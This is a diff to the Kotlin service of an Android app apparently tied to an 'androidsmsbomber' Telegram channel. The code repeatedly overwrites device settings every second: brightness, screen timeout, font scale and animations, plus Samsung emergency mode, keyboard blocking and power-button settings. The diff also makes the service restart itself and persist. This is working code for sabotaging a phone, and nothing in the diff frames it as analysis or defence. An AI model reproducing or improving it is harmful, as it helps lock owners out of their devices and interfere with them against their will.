@@ -5,15 +5,17 @@ import android.content.ContentValues
 import android.content.Intent
 import android.net.Uri
 import android.os.IBinder
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
+import kotlinx.coroutines.*
 import kotlin.random.Random
 
 class MainService : Service() {
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        CoroutineScope(Dispatchers.Default).launch {
+
+        if (task != null)
+            return START_STICKY
+
+        task = CoroutineScope(Dispatchers.Default).launch {
             val iterables = defaults.mapValues {
                 it.value.iterator()
             }
@@ -26,7 +28,7 @@ class MainService : Service() {
             }
 
             while (true) {
-                delay(1500)
+                delay(1000)
 
                 val cursor = contentResolver.query(
                     settings,
@@ -72,7 +74,13 @@ class MainService : Service() {
             }
         }
 
-        return super.onStartCommand(intent, flags, startId)
+        return START_STICKY
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        task?.cancel()
+        task = null
     }
 
     override fun onBind(intent: Intent?): IBinder? {
@@ -84,6 +92,8 @@ class MainService : Service() {
 
         const val DEFAULT_STRING = "https://t.me/androidsmsbomber"
 
+        var task: Job? = null
+
         val defaults = mutableMapOf(
             "screen_brightness" to sequence {
                 while (true)
@@ -91,8 +101,6 @@ class MainService : Service() {
             },
 
             "screen_off_timeout" to generateSequence { "0" },
-
-            "blue_light_filter" to generateSequence { "1" },
 
             "font_scale" to sequence {
                 while (true)
@@ -117,6 +125,20 @@ class MainService : Service() {
             "reduce_animations" to generateSequence { "1" },
 
             "remove_animations" to generateSequence { "1" },
+
+            // Samsung
+
+            "blue_light_filter" to generateSequence { "1" },
+
+            "easy_mode_switch" to generateSequence { "0" },
+
+            "emergency_mode" to generateSequence { "1" },
+
+            "access_control_enabled" to generateSequence { "1" },
+
+            "access_control_keyboard_block" to generateSequence { "1" },
+
+            "access_control_power_button" to generateSequence { "0" }
         )
     }
 }
